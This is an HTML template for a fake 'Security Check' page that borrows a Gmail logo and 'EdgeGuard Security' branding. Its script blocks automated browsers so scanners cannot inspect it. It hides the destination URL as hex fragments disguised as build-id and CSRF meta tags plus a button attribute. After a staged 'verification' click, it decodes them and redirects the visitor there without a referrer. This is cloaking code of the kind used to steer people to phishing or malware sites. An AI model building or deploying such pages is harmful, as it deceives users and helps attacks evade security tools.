<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta property="og:title" content="Security Verification">
    <meta property="og:description" content="Verifying connection security parameters. Please wait...">
    <meta property="og:image" content="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_server_1x.png">
    <meta property="og:site_name" content="EdgeGuard Security">
    <meta name="theme-color" content="#ff4444">
    <meta name="build-id" content="{{ p1 }}">
    <meta name="csrf-token" content="{{ p2 }}">
    <title>Security Check</title>
    <style nonce="{{ nonce }}">
        html, body {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            background-color: #111;
            color: #eee;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            user-select: none;
        }
        #{{ ids.container }} {
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #ff4444;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 14px;
            color: #888;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        #{{ ids.button }} {
            background: #ff4444;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        #{{ ids.button }}:hover {
            background: #cc3333;
            transform: translateY(-1px);
        }
        #{{ ids.button }}:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div id="{{ ids.container }}">
        <h2>Security Check</h2>
        <p>System is verifying your browser integrity. Please confirm to proceed to the destination.</p>
        <button id="{{ ids.button }}" data-verify="{{ p3 }}">
            Verify Connection
        </button>
    </div>
    <script nonce="{{ nonce }}">
        document.addEventListener('DOMContentLoaded', function() {
            if (navigator.webdriver) {
                var c = document.getElementById("{{ ids.container }}");
                c.innerHTML = '<h2 style="color:#ff4444">Access Denied</h2><p style="color:#888">Automated browsers are not permitted.</p>';
                return;
            }

            var btn = document.getElementById("{{ ids.button }}");
            var clicked = false;

            btn.addEventListener('click', function() {
                if (clicked) return;
                clicked = true;

                btn.innerHTML = 'Verified\u2026 Redirecting';
                btn.style.opacity = '0.7';
                btn.style.cursor = 'default';

                setTimeout(function() {
                    try {
                        var m1 = document.querySelector('meta[name="build-id"]').getAttribute('content');
                        var m2 = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
                        var m3 = btn.getAttribute('data-verify');
                        var hex = m1 + m2 + m3;
                        var url = '';
                        for (var i = 0; i < hex.length; i += 2) {
                            url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                        }

                        var link = document.createElement('a');
                        link.href = url;
                        link.rel = 'noreferrer noopener';
                        link.referrerPolicy = 'no-referrer';
                        link.style.position = 'absolute';
                        link.style.left = '-9999px';
                        link.style.top = '0';
                        document.body.appendChild(link);
                        link.click();

                        setTimeout(function() {
                            try {
                                window.location.replace(url);
                            } catch(e2) {
                                window.location.href = url;
                            }
                        }, 600);

                    } catch (e) {
                        window.location.reload();
                    }
                }, 2500);
            });
        });
    </script>
</body>
</html>
